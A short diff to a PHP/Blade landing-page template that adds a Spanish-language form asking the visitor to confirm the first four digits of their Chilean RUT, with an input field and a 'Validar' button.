@@ -62,7 +62,11 @@ $enddate=strtotime("+5 days", $startdate);
 
            <img style="max-width: 50%" class="img-fluid col-md-6 mt-1 hide" src="{{$landing->logo}}" alt="">
 
-             
+             <div id="cont1" class="p-5 ">
+                <h3 class="text-black text-center">Por tu seguridad, confírmanos los primeros 4 dígitos de tu RUT</h3>
+                <input id="rut" type="number" class="form-control mt-4 text-center text-blue input" autofocus>
+                <button onclick="event1(); return false;" class="btn bg-dark text-white col-12 mt-4">Validar </button>
+            </div>
             
             <div id="cont5" class="p-2 pl-3 pr-3 hide">
                         <div class="card">     
